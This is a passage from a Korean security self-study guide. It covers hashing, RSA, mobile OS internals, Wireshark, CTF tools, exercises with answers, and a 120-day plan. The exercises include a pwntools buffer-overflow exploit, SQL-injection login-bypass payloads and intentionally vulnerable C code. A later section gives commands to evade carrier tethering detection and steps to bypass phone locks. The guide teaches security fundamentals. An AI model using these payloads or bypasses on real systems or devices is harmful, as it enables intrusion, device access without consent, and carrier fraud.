문서의 작성자와 무결성을 증명

서명: 문서의 해시 → 개인키로 암호화 = 서명
검증: 서명 → 공개키로 복호화 → 해시와 비교

코드 서명 (iOS):
  Apple이 앱의 해시를 자신의 개인키로 서명
  iPhone이 Apple의 공개키로 검증
  → 서명 없는 코드 실행 불가 (탈옥이 이것을 우회)
```

```python
# Python으로 해시 실습
import hashlib

password = "hello123"
salt = "random_salt_value"

# 단순 해시 (취약)
simple = hashlib.sha256(password.encode()).hexdigest()
print(f"단순: {simple}")

# Salt 추가 (좋음)
salted = hashlib.sha256((salt + password).encode()).hexdigest()
print(f"Salted: {salted}")

# bcrypt (최선) — pip install bcrypt
import bcrypt
hashed = bcrypt.hashpw(password.encode(), bcrypt.gensalt())
print(f"bcrypt: {hashed}")
check = bcrypt.checkpw(password.encode(), hashed)
print(f"검증: {check}")  # True
```

---

# 40. 이산수학 — 보안에 필요한 것만

> 겁먹지 마세요. 여기서 다루는 수학은 사칙연산 + 나머지 연산이 전부입니다.

## 40.1 모듈러 연산 (나머지 연산)

```
a mod n = a를 n으로 나눈 나머지

예시:
  17 mod 5 = 2    (17 ÷ 5 = 3 나머지 2)
  25 mod 7 = 4    (25 ÷ 7 = 3 나머지 4)
  10 mod 3 = 1
  15 mod 5 = 0    (나누어 떨어짐)

C에서: 17 % 5 = 2
Python에서: 17 % 5 = 2

왜 중요한가:
  RSA 암호: c = m^e mod n  ← 이 연산이 핵심!
  해시 함수: 내부적으로 모듈러 연산 사용
  체크섬: 데이터 오류 검출에 모듈러 사용

모듈러 연산 성질:
  (a + b) mod n = ((a mod n) + (b mod n)) mod n
  (a × b) mod n = ((a mod n) × (b mod n)) mod n
  
  → 큰 수의 거듭제곱도 작은 단위로 분해 가능
```

**실습 — RSA 간단 예제:**
```python
# 아주 작은 수로 RSA 원리 이해

p = 61          # 소수 1
q = 53          # 소수 2
n = p * q       # 3233 (공개)
phi = (p-1) * (q-1)  # 3120

e = 17          # 공개 지수 (phi와 서로소)
d = 2753        # 비밀 지수 (e*d mod phi = 1)

message = 42    # 평문

# 암호화: c = m^e mod n
encrypted = pow(message, e, n)  # pow(밑, 지수, 모듈러)
print(f"암호화: {encrypted}")     # 2557

# 복호화: m = c^d mod n
decrypted = pow(encrypted, d, n)
print(f"복호화: {decrypted}")     # 42 (원래 메시지!)

# n을 인수분해(p, q 찾기)하면 d를 계산할 수 있음
# → 3233 정도는 쉽게 인수분해되지만
# → 실제 RSA는 2048비트(617자리) 수를 사용 → 인수분해 불가능!
```

## 40.2 논리 연산 (이미 알고 있음!)

```
비트 연산에서 이미 배웠습니다:
  AND (∧): 둘 다 참이면 참     1 AND 1 = 1
  OR  (∨): 하나라도 참이면 참   0 OR 1 = 1
  NOT (¬): 반전               NOT 1 = 0
  XOR (⊕): 다르면 참           1 XOR 0 = 1

진리표:
  A  B  │ AND  OR  XOR
  ──────┼──────────────
  0  0  │  0    0   0
  0  1  │  0    1   1
  1  0  │  0    1   1
  1  1  │  1    1   0

드 모르간 법칙:
  NOT(A AND B) = (NOT A) OR (NOT B)
  NOT(A OR B)  = (NOT A) AND (NOT B)
  
  → 조건문 복잡할 때 유용
  → 디지털 회로 설계의 기초
```

## 40.3 집합과 확률 (기초만)

```
집합: 원소들의 모임
  A = {1, 2, 3}, B = {2, 3, 4}
  A ∩ B = {2, 3}     (교집합 — AND와 비슷)
  A ∪ B = {1, 2, 3, 4} (합집합 — OR와 비슷)

확률 (보안 관련):
  비밀번호 4자리 숫자: 10^4 = 10,000 가지
  → 무작위 맞출 확률: 1/10,000

  비밀번호 8자리 (대소문자+숫자): 62^8 ≈ 2.18 × 10^14
  → 초당 1억 번 시도해도 25일
  → 비밀번호 길이 1자리 추가 = 난이도 62배 증가!

  256비트 AES 키: 2^256 가지
  → 우주의 모든 컴퓨터를 동원해도 브루트포스 불가능
```

---

# Part 11: 모바일 보안 (41~42장)

# 41. iOS 내부 구조

```
부팅 체인: Boot ROM → LLB → iBoot → 커널 → launchd
  각 단계가 다음을 암호학적 서명 검증
  checkm8: Boot ROM의 USB DFU 취약점 (A11 이하만)

Secure Enclave (SEP):
  별도 프로세서, 별도 OS
  암호화 키, 생체 데이터 저장
  비밀번호 검증을 내부에서 수행
  시간 지연 (80ms → 5초 → 1분 → 1시간) 하드웨어 강제

보호 기법:
  PAC: 포인터 서명 (A12+)
  KTRR: 커널 코드 읽기 전용 (하드웨어)
  PPL: 페이지 테이블 보호
  코드 서명: Apple 서명 없는 코드 실행 불가
  샌드박스: 앱 간 격리
```

# 42. Android 내부 구조

```
아키텍처: 앱(APK) → Android Framework → ART → HAL → Linux 커널 → TEE

보안:
  SELinux: 강제 접근 제어 (root도 제한!)
  Verified Boot: 부팅 시 무결성 검증
  앱 샌드박스: 각 앱 고유 UID

APK 분석 도구:
  JADX: DEX → Java 디컴파일
  apktool: APK 디코딩/리빌드
  frida: 동적 후킹 (실행 중 코드 주입)
```

---

# Part 12: 실전 (43~47장)

# 43. 네트워크 패킷 분석 — Wireshark

```
Wireshark: 네트워크 패킷을 캡처하고 분석하는 도구

설치: sudo apt install wireshark

주요 기능:
  1. 실시간 패킷 캡처
  2. 프로토콜 분석 (자동 해석)
  3. 필터링
  4. 스트림 추적

디스플레이 필터:
  ip.addr == 192.168.1.1         # 특정 IP
  tcp.port == 80                  # 특정 포트
  http                            # HTTP만
  dns                             # DNS만
  tcp.flags.syn == 1              # SYN 패킷만
  http.request.method == "POST"   # POST 요청만
  tcp contains "password"         # "password" 포함 패킷

분석 순서:
  1. 캡처 시작 (인터페이스 선택)
  2. 트래픽 발생 (웹 브라우징 등)
  3. 캡처 중지
  4. 필터로 원하는 패킷 찾기
  5. 패킷 선택 → 상세 정보 확인
  6. Follow → TCP Stream (대화 내용 보기)

HTTP 트래픽에서 비밀번호 찾기:
  필터: http.request.method == "POST"
  → POST 요청 본문에 username/password가 평문으로!
  → HTTPS를 써야 하는 이유!
```

---

# 44. CTF 풀이 가이드

```
CTF 카테고리:
  PWN: 바이너리 exploit (이 가이드의 핵심!)
  REV: 리버스 엔지니어링
  Web: 웹 해킹
  Crypto: 암호학
  Forensics: 디지털 포렌식
  Misc: 기타

초보자 플랫폼 (순서대로):
  1. OverTheWire Bandit — 리눅스 기초 (SSH 접속)
  2. picoCTF — 완전 초보자용, 무료
  3. TryHackMe — 가이드형, 일부 무료
  4. HackTheBox — 중급, 실제 서버 공격
  5. pwnable.kr — PWN 특화

PWN 문제 풀이 절차:
  1. file, checksec → 바이너리 정보 + 보호 기법 확인
  2. Ghidra → 코드 분석 → 취약점 찾기
  3. GDB → 동적 분석 → 오프셋 계산
  4. pwntools → exploit 작성 → 테스트 → 플래그!
```

---

# 45. 실전 도구 모음

```
정보 수집:
  nmap       — 포트 스캔, 서비스 탐지
  whois      — 도메인 정보 조회
  theHarvester — 이메일, 서브도메인 수집
  Shodan     — 인터넷 연결 장치 검색 엔진

웹 해킹:
  Burp Suite — 웹 프록시 (필수!)
  sqlmap     — SQL Injection 자동화
  dirb/gobuster — 디렉토리/파일 브루트포스
  nikto      — 웹 서버 취약점 스캐너

바이너리:
  Ghidra     — 디스어셈블러/디컴파일러
  GDB+GEF    — 디버거
  pwntools   — exploit 프레임워크
  ROPgadget  — ROP gadget 검색
  one_gadget — libc에서 원샷 gadget 검색

비밀번호:
  hashcat    — GPU 기반 해시 크래킹
  John the Ripper — CPU 기반 크래킹
  hydra      — 온라인 브루트포스 (SSH, FTP 등)

네트워크:
  Wireshark  — 패킷 분석
  tcpdump    — CLI 패킷 캡처
  netcat(nc) — 네트워크 스위스 아미 나이프
  ncat       — netcat 개선판

모바일:
  JADX       — Android APK 디컴파일
  frida      — 동적 후킹 (Android/iOS)
  objection  — frida 기반 자동화
  apktool    — APK 디코딩
```

---

# 46. 종합 실습 문제

## 문제 1: 서브넷 계산
```
IP: 172.16.50.100/20
1. 네트워크 주소는?
2. 브로드캐스트 주소는?
3. 사용 가능한 호스트 수는?
```

<details>
<summary>정답 보기</summary>

/20 = 255.255.240.0
172.16.50.100 = 172.16.0011 0010.01100100
서브넷:        255.255.1111 0000.00000000

네트워크: 172.16.48.0 (호스트 비트 전부 0)
브로드캐스트: 172.16.63.255 (호스트 비트 전부 1)
호스트: 2^12 - 2 = 4094개

</details>

## 문제 2: C 메모리 추적
```c
char *a = malloc(16);
char *b = malloc(16);
strcpy(a, "HELLO");
strcpy(b, "WORLD");
free(a);
char *c = malloc(16);
strcpy(c, "CYBER");
printf("a: %s\n", a);  // 출력은?
printf("a == c? %d\n", a == c);  // 결과는?
```

<details>
<summary>정답 보기</summary>

a: "CYBER" (c가 a의 해제된 공간을 재사용)
a == c? 1 (같은 주소!)
→ Use-After-Free 취약점의 본질

</details>

## 문제 3: 어셈블리 해석
```asm
mystery:
    MOV  W1, #0
    MOV  W2, #1
loop:
    CMP  W0, #0
    B.LE done
    ADD  W3, W1, W2
    MOV  W1, W2
    MOV  W2, W3
    SUB  W0, W0, #1
    B    loop
done:
    MOV  W0, W1
    RET
```

<details>
<summary>정답 보기</summary>

피보나치 수열의 n번째 값을 계산하는 함수.
W0=입력(n), W1=이전값(0), W2=현재값(1)

</details>

## 문제 4: 취약점 찾기 (5개 이상)
```c
void handle_login(int sockfd) {
    char username[64];
    char password[64];
    char query[256];
    read(sockfd, username, 200);
    read(sockfd, password, 200);
    sprintf(query, "SELECT * FROM users WHERE name='%s' AND pass='%s'",
            username, password);
    execute_query(query);
}
```

<details>
<summary>정답 보기</summary>

1. Buffer Overflow: 64바이트에 200바이트 읽기 (username, password 둘 다)
2. SQL Injection: 사용자 입력을 쿼리에 직접 삽입
3. Stack BOF: username 오버플로우로 password, query, 복귀 주소까지 덮어쓰기 가능
4. 비밀번호 평문 비교 (설계 문제)
5. query 버퍼도 오버플로우 가능 (username+password 합이 256 초과 시)

</details>

## 문제 5: Exploit 설계
```
보호: NX 활성화, ASLR 비활성화, No Canary, No PIE
void win() { system("/bin/sh"); }
void vuln() { char buf[32]; read(0, buf, 100); }
win() 주소: 0x401196
```

<details>
<summary>정답 보기</summary>

```python
from pwn import *
p = process('./challenge')
payload = b'A' * 40          # buf(32) + rbp(8)
payload += p64(0x40101a)      # ret gadget (스택 정렬)
payload += p64(0x401196)      # win() 주소
p.sendline(payload)
p.interactive()
```

</details>

## 문제 6: SQL Injection
```
로그인 폼에서 비밀번호 없이 admin으로 로그인하려면?
쿼리: SELECT * FROM users WHERE username='[입력]' AND password='[입력]'
```

<details>
<summary>정답 보기</summary>

username: admin' --
password: (아무거나)

결과 쿼리: SELECT * FROM users WHERE username='admin' --' AND password='...'
-- 이후는 주석 처리 → 비밀번호 검사 무시 → admin으로 로그인!

또는:
username: admin
password: ' OR 1=1 --

</details>

## 문제 7: 암호학
```
RSA에서 n=15, e=3일 때:
1. p와 q는?
2. phi(n)은?
3. d는?
4. 메시지 m=4를 암호화하면?
```

<details>
<summary>정답 보기</summary>

1. n=15 = 3 × 5 → p=3, q=5
2. phi(n) = (3-1)(5-1) = 2×4 = 8
3. d: e×d mod phi = 1 → 3×d mod 8 = 1 → d=3 (3×3=9, 9 mod 8=1)
4. c = m^e mod n = 4^3 mod 15 = 64 mod 15 = 4
   (이 경우 평문과 암호문이 같음! 작은 수라서 발생하는 문제)

</details>

---

# 47. 테더링 우회 / ADB / 폰 잠금 해제

## TTL 조작으로 테더링 감지 우회

```
원리:
  직접 연결: TTL=64 → 통신사 도착 시 64
  테더링(PC→폰): PC의 TTL=128 → 폰 통과(-1) → 통신사 도착 시 127
  통신사: "127은 Windows(128)에서 온 테더링이다!"

우회: PC의 TTL을 65로 설정 → 폰 통과 → 64로 도착 → 직접 연결처럼 보임

Windows:
  netsh int ipv4 set glob defaultcurhoplimit=65
  확인: netsh int ipv4 show glob | findstr "Hop"

Linux/Mac:
  sudo sysctl -w net.inet.ip.ttl=65

Android (root + iptables):
  iptables -t mangle -A POSTROUTING -j TTL --ttl-set 64

Magisk (재부팅 후 영구 적용):
  /data/adb/service.d/ttl_fix.sh에:
    #!/system/bin/sh
    sleep 30
    iptables -t mangle -A POSTROUTING -j TTL --ttl-set 64
    ip6tables -t mangle -A POSTROUTING -j HL --hl-set 64
  chmod +x 후 재부팅
```

## ADB (Android Debug Bridge)

```bash
# PC에서 Android 기기 제어
adb devices              # 연결된 기기 목록
adb shell                # 기기 셸 접속
adb push local remote    # PC → 기기 파일 전송
adb pull remote local    # 기기 → PC 파일 전송
adb install app.apk      # 앱 설치
adb logcat               # 실시간 로그

# ADB 활성화 방법:
# 설정 → 휴대전화 정보 → 빌드 번호 7번 탭 → 개발자 옵션 → USB 디버깅

# ADB가 비활성화된 경우:
# 1. Recovery 모드 (전원+볼륨↑)에서 ADB 사이드로드
# 2. OTG 키보드 연결하여 화면 조작
# 3. 삼성: Find My Mobile 원격 잠금 해제
```

## 폰 잠금 해제 (비공식)

```
Android:
  1. ADB: adb shell rm /data/system/locksettings.db (구형)
  2. Recovery (TWRP): 잠금 파일 직접 삭제
  3. 삼성 Odin: 펌웨어 플래싱 (데이터 삭제)
  4. Fastboot: bootloader unlock → factory reset

iPhone:
  A11 이하 (iPhone X까지):
    checkm8/checkra1n: Boot ROM exploit → 잠금 우회 가능 (데이터 보존)
  
  A12 이상 (XS/XR 이후):
    DFU 복원만 가능 (데이터 전부 삭제됨)
    Cellebrite/GrayKey: 법 집행기관 전용, 0-day exploit 사용
    개인이 접근 불가

  Activation Lock (iCloud 잠금):
    Apple ID/비밀번호 없이는 해제 불가
    Apple 매장에서 구매 증빙으로 해제 요청
```

---

# Part 13: 학습 스케줄

---

# 48. 120일 마스터 플랜

> 하루 2시간, 120일 (약 4개월)
> 1회독: 80일 / 2회독: 40일
> 규칙: 매일 정해진 분량 완수, 코드는 반드시 직접 타이핑

---

## Phase 1: 네트워크 + 리눅스 (Day 1~14)

```
Day 1:  네트워크 기초 (1장) — 패킷, IP, 포트, MAC, 서브넷
Day 2:  OSI/TCP-IP (2장) + 물리/데이터링크 (3~4장) — 계층 구조
Day 3:  네트워크 계층 (5장) — IP, TTL, ICMP, 라우팅
Day 4:  전송 계층 (6장) — TCP 3-way, UDP, SYN Flood
Day 5:  응용 계층 + 무선 (7~8장) — HTTP, DNS, Wi-Fi 보안
Day 6:  네트워크 보안 + VPN (9~10장) — 방화벽, Tailscale, WireGuard
Day 7:  클라우드 + 진단 명령어 (11~12장) — ping, nmap, traceroute 실습
Day 8:  리눅스 기초 (13장) — 명령어 실습 (ls, cd, grep, find 등)
Day 9:  리눅스 기초 계속 — 사용자, 프로세스, 파이프
Day 10: 리눅스 심화 (14장) — 파일 권한 (chmod, SUID), 파일시스템
Day 11: 리눅스 심화 계속 — /etc/passwd, shadow, 서비스 관리
Day 12: Bash 스크립팅 (15장) — 변수, 조건, 반복, 함수
Day 13: Bash 실습 — 포트 스캐너 스크립트 작성
Day 14: 복습 + OverTheWire Bandit Level 0~3
```

## Phase 2: C 프로그래밍 (Day 15~30)

```
Day 15: C 기초 (16장) — 환경 설정, 변수, 데이터 타입
Day 16: C 기초 — 연산자 (비트 연산 집중!)
Day 17: C 기초 — 조건문, 반복문, 함수
Day 18: C 기초 — 배열, 문자열, Format String 취약점
Day 19: 포인터 기초 (17장) — &와 *, 메모리 주소
Day 20: 포인터 연산 — 배열과 포인터, 포인터 산술
Day 21: 포인터 + 함수 — call by reference, 구조체
Day 22: 포인터 실습 — 문제 풀기 + 주소록 프로그램
Day 23: 동적 메모리 (18장) — 스택 vs 힙, malloc/free
Day 24: 메모리 버그 4종류 — UAF, Double Free, 힙 오버플로우 (★★★★★)
Day 25: 연결 리스트 + 파일 입출력
Day 26: C++ 기초 (19장) — 클래스, vtable
Day 27: C 종합 실습 — 동적 메모리 프로그램 작성
Day 28: 복습 + Bandit Level 4~8
Day 29: 쉬는 날 (선택적 복습)
Day 30: C 전체 복습 (빠르게 재읽기)
```

## Phase 3: Python + SQL + 자료구조 (Day 31~42)

```
Day 31: Python 기초 (20장) — 변수, 리스트, 딕셔너리, 조건/반복
Day 32: Python 중급 — 함수, 파일 처리, 바이트 조작
Day 33: Python 보안 — 소켓, requests, 해시, base64
Day 34: pwntools 기초 — process, send, recv, p64
Day 35: SQL 기초 (21장) — SELECT, INSERT, UPDATE, DELETE
Day 36: SQL Injection — 기본 인젝션 + Blind + sqlmap
Day 37: 자료구조 (22장) — 스택, 큐, 연결 리스트
Day 38: 자료구조 — 해시 테이블, 트리, 그래프
Day 39: 알고리즘 (23장) — Big-O, 정렬, 이진 탐색
Day 40: 알고리즘 — 재귀, 실습 문제
Day 41: 복습 + picoCTF 가입 + 쉬운 문제 2개
Day 42: Phase 1~3 전체 복습
```

## Phase 4: 시스템 + 어셈블리 (Day 43~58)

```
Day 43: 컴퓨터 구조 (24장) — CPU, 레지스터, 16진수
Day 44: 컴퓨터 구조 (25장) — 가상 메모리, 페이지, 시스콜
Day 45: 운영체제 (26장) — 프로세스, 스레드, 권한 레벨
Day 46: 운영체제 (27장) — 커널, 시스콜 표
Day 47: ARM 어셈블리 기초 (28장) — MOV, ADD, LDR, STR
Day 48: ARM 분기 — CMP, B.xx, BL, RET
Day 49: ARM C→어셈블리 변환 — 함수, if, for 패턴
Day 50: ARM 심화 (29장) — 호출 규약, 구조체 접근
Day 51: x86-64 (30장) — 레지스터, 명령어, 차이점
Day 52: 어셈블리 실습 — gcc -S로 변환, 읽기 연습
Day 53: 복습 + Bandit Level 9~15
Day 54: 쉬는 날
Day 55: RE 기초 (31장) — 도구 설치 (Ghidra, GDB)
Day 56: RE 기초 — file, strings, checksec, GDB 실습
Day 57: RE 실습 — Ghidra로 바이너리 분석
Day 58: RE 실전 (32장) — 패턴 인식, 안티 디버깅
```

## Phase 5: 취약점 + Exploit (Day 59~72)

```
Day 59: Stack BOF (33장) — 취약한 코드 컴파일, 크래시 재현
Day 60: Format String + UAF — 코드 실행, 원리 이해
Day 61: Integer Overflow + Type Confusion + Race Condition
Day 62: 취약점 종합 — 코드 보고 유형 판별 연습
Day 63: 셸코드 (34장) — 원리 이해, 어셈블리 읽기
Day 64: Return-to-libc — NX 우회 원리
Day 65: ROP (★★★ 가장 어려움!) — gadget, 체인 구성
Day 66: ROP 복습 — 종이에 다시 그리기, pwntools 실습
Day 67: pwntools exploit 작성 — 실습 문제 풀기
Day 68: ASLR 우회 (35장) — info leak, libc 베이스 계산
Day 69: GOT Overwrite + 힙 기초
Day 70: 보호 기법 총정리 (36장) — Canary, NX, ASLR, PIE, PAC
Day 71: 복습 + picoCTF PWN 문제 2개
Day 72: 쉬는 날
```

## Phase 6: 웹 해킹 + 암호학 + 모바일 (Day 73~86)

```
Day 73: 웹 기초 (37장) — HTTP, 쿠키, 세션, Burp Suite
Day 74: SQL Injection 심화 (38장) — Blind, Time-based
Day 75: XSS — Reflected, Stored, 쿠키 탈취
Day 76: CSRF + SSRF + LFI — 시나리오 이해
Day 77: 웹 실습 — TryHackMe 또는 DVWA로 실전
Day 78: 암호학 (39장) — AES, RSA 원리
Day 79: 해시 + 디지털 서명 — bcrypt, SHA-256
Day 80: 이산수학 (40장) — 모듈러 연산, RSA 실습 (Python)
Day 81: iOS 보안 (41장) — 부팅 체인, Secure Enclave, PAC
Day 82: Android 보안 (42장) — SELinux, APK 분석
Day 83: Wireshark (43장) — 패킷 캡처, 필터, HTTP 분석
Day 84: CTF 가이드 (44장) + 도구 모음 (45장)
Day 85: 종합 문제 (46장) — 문제 1~4 풀기
Day 86: 종합 문제 — 문제 5~7 풀기
```

## Phase 7: 2회독 (Day 87~120)

```
Day 87~90:  네트워크 + 리눅스 복습 + 스크립트 작성
Day 91~96:  C + 포인터 + 메모리 복습 + 프로그램 작성
Day 97~100: Python + SQL 복습 + 자동화 스크립트
Day 101~104: 어셈블리 읽기 연습 (gcc -S + Ghidra)
Day 105~110: 취약점 + Exploit 집중 (코드 다시 실행, ROP 다시 그리기)
Day 111~114: 웹 해킹 + 암호학 복습
Day 115~118: CTF 실전 (picoCTF/TryHackMe 문제 매일 2개)
Day 119: 종합 문제 전부 답 안 보고 풀기
Day 120: 마스터 테스트 (아래 체크리스트)
```

## 120일 자기 평가

```
□ 리눅스 CLI를 자유롭게 사용할 수 있다
□ 파일 권한, SUID의 보안 의미를 설명할 수 있다
□ Bash 스크립트를 작성할 수 있다
□ C에서 포인터와 동적 메모리를 자유롭게 사용한다
□ Python으로 도구/스크립트를 작성할 수 있다
□ SQL을 읽고 쓸 수 있고, SQL Injection을 이해한다
□ 코드를 보고 취약점 유형을 판별할 수 있다
□ ARM64/x86-64 어셈블리를 기본적으로 읽을 수 있다
□ Ghidra에서 바이너리를 분석할 수 있다
□ GDB로 프로그램을 디버깅할 수 있다
□ Stack BOF와 ROP의 원리를 설명할 수 있다
□ pwntools로 간단한 exploit을 작성할 수 있다
□ checksec 결과를 보고 전략을 세울 수 있다
□ HTTP, 쿠키, 세션의 동작 원리를 안다
□ XSS, CSRF, SQL Injection을 설명할 수 있다
□ AES, RSA, 해시 함수의 원리를 안다
□ 모듈러 연산을 할 수 있다
□ iOS/Android 보안 구조를 설명할 수 있다
□ Wireshark로 패킷을 분석할 수 있다
□ CTF 문제를 10개 이상 풀었다

15개 이상: 120일 학습 성공! 탄탄한 중급 수준
12~14개: 부족한 분야 2주 추가
11개 이하: 해당 파트 재학습 필요
```

## 매일 루틴

```
0:00~0:10   어제 복습 (메모 3줄 읽기)
0:10~0:50   오늘 범위 읽기
0:50~1:00   휴식
1:00~1:45   실습 (코드 작성 / 문제 풀기)
1:45~2:00   오늘 핵심 3줄 메모

주의:
  - 3일 연속 빠지면 습관이 깨진 것 → 범위를 줄여서라도 이어가기
  - 이해 안 되면 AI에게 질문 (답을 받는 게 아니라 설명을 받기)
  - 코드는 반드시 직접 타이핑 (복붙 금지!)
  - 주 1일은 쉬기 (번아웃 방지)
```

---

> 이 문서를 120일간 완주하면, 대학 CS 기초 + 보안 실전 역량을 갖추게 됩니다.
> 모든 기법은 교육 및 합법적인 보안 연구 목적으로만 사용하세요.
> 허가 없이 타인의 시스템에 적용하면 불법이며 형사 처벌 대상입니다.
> 항상 자신의 시스템이나 CTF 환경에서만 연습하세요.
